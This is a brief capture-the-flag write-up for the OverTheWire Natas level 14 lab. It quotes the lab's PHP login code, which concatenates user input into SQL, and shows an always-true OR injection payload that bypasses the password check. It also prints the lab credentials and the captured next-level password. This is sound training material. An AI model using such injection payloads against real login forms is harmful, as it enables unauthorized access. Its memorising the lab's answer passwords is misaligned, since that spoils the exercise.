Level #14 go to URL and find natas15 user password

- URL: http://natas14.natas.labs.overthewire.org/
- User: natas14
- Password: qPazSJBmrmU7UQJv17MHk1PGC4DxZMEP

After navigating to URL an html page with a form with 3 inputs and an anchor element with the text "View sourcecode" is loaded.
Clicking on the anchor elements redirects to the source code of the php script being run by server.
  

```PHP
<?php
if(array_key_exists("username", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas14', '<censored>');
    mysqli_select_db($link, 'natas14');

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    if(mysqli_num_rows(mysqli_query($link, $query)) > 0) {
            echo "Successful login! The password for natas15 is <censored><br>";
    } else {
            echo "Access denied!<br>";
    }
    mysqli_close($link);
} else {
?>
```

The query is not sanitized and should be simple to modify it in a way that it doesn't ask for a password.

Bypassed by adding an or operator and a condition that is always true to both sides of the and operator.

Final SQL query will be:
```SQL
SELECT * from users where username="" OR "1"="1"" and password="" OR "1"="1""
```
  
Recreated the request with postman.
  
  
The password for natas15 is 
TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB
